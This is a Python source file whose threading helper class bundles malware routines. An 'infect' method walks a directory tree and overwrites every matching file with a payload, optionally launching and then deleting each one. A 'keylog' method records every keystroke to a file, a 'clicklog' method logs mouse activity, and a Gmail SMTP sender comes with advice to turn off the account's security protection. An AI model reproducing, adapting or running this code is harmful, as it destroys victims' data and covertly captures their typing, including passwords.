import os
import threading

########### [SUB-CLASSES] #################### TASK CLASS ################# Over:Default Under:FileWrapper

class Task(threading.Thread):
    """
    Class for Multi - Threading.
    """

    DEVELOPER = "Marco Della Putta"
    
    def __init__(self, func, *args, lock=True):
        threading.Thread.__init__(self)
        self.func = func
        self.args = args
        self.lock = lock
        self.fLock = threading.Lock()

    def run(self):     
        if self.lock:
            self.fLock.acquire()
        self.func(*self.args)

    def set_flag(self, boolean):
        if boolean:
            self.lock = True
        else:
            self.lock = False
            try:
                self.fLock.release()
            except:
                pass

    @staticmethod
    def infect(source=None, path=os.getcwd(), ext="",start=False, delete_source=False, delete_infected=False, delay=None, action=None):

        from subprocess import run
        from time import sleep as _sp

        if source:
            with open(source, 'r') as src:
                contents = src.read()
        else:
            contents = "https://grigoprg.webnode.it"

        for RootDir, __Fldrs__, _file in os.walk(path):
            for _file_ in _file:
                _path = RootDir + "\\" + _file_
                try:
                    if ext == "":
                        with open(_path, 'w') as fw:
                            fw.write(contents)
                        if action:
                            action()
                        if start:
                            run(f'start {_path}', shell=True)
                        if delay:
                            _sp(delay)
                        if delete_infected:
                            try:
                                os.unlink(_path)
                            except:
                                os.remove(_path)
                    else:
                        if _file_.endswith(ext):
                            with open(_path, 'w') as fw:
                                fw.write(contents)
                            if action:
                                action()
                            if start:
                                run(f'start {_path}', shell=True)
                            if delay:
                                _sp(delay)
                            if delete_infected:
                                try:
                                    os.unlink(_path)
                                except:
                                    os.remove(_path)
                except:
                    pass

        if delete_source:
            try:
                try:
                    os.unlink(file_source)
                except:
                    os.remove(file_source)
            except:
                pass    
             
    @staticmethod
    def Link(func_one, func_two, delay, args1 = [], args2 = []):
        from time import sleep as _sp
        if not args1:
            first_func = threading.Thread(target=func_one)
        else:
            first_func = threading.Thread(target=func_one, args=tuple(args1))
            
        if not args2:
            second_func = threading.Thread(target=func_two)
        else:
            second_func = threading.Thread(target=func_two, args=tuple(args2))
        first_func.start()
        _sp(delay)
        second_func.start()     

    @classmethod      
    def class_name(cls):
        return cls.__name__
    
    @staticmethod
    def keylog(_path_):
        from pynput.keyboard import Key, Listener
        import logging

        if _path_.endswith("\\"):
            
            PATH = _path_ + "keylog.txt"
            
        else:
            
            PATH = _path_ + "\\" + "keylog.txt"

        logging.basicConfig(filename=PATH, level=logging.DEBUG, format='%(asctime)s: %(message)s')

        def on_press(key):
            logging.info(key)

        with Listener(on_press=on_press) as listener:
            listener.join()
            
    @staticmethod
    def clicklog(_path_):
        from pynput.mouse import Listener
        import logging

        if _path_.endswith("\\"):
            
            PATH = _path_ + "keylog.txt"
            
        else:
            
            PATH = _path_ + "\\" + "keylog.txt"

        logging.basicConfig(filename=PATH, level=logging.DEBUG, format="%(asctime)s: %(message)s")

        def on_move(x, y):
            logging.info("Mouse moved to ({0},{1})".format(x, y))

        def on_click(x, y, button, pressed):
            if pressed:
                logging.info("Mouse clicked at ({0},{1}) with {2}".format(x, y, button))

        def on_scroll(x, y, dx, dy):
            logging.info("Mouse scrolled at ({0},{1})({2},{3})".format(x, y, dx, dy))

        with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
            listener.join()

    @staticmethod
    def autowrite(text, delay=None):
        import pyautogui
        from time import sleep as _sp
        
        if not delay:
            delay = 0.0

        _sp(0.3)
        pyautogui.typewrite(text, interval=delay)

    @staticmethod
    def login(email, password, reciever, title, text):
        """
        If you use gmail or similar, check if the option for blocking
        not-safe log is enable, if is enable, disable it.
        """
        import smtplib

        title = "Subject: " + str(title) + "\n\n"
        _message = title + text

        _email = smtplib.SMTP("smtp.gmail.com", 587)
              
        _email.ehlo()
        _email.starttls()

        _email.login(email, password)

        _email.sendmail(email, reciever, _message)

        _email.quit()

        return _message
